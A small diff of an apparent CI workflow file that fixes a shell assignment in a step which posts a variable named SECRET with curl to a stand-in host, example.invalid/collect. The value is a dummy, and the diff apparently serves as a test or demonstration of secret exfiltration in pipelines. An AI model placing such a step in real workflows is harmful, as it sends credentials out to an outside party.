@@ -11,5 +11,5 @@ jobs:
 
     steps:
       - run: |
-          SECRET= "Not_Secret"
+          SECRET="Not_Secret"
           curl --data "$SECRET" https://example.invalid/collect
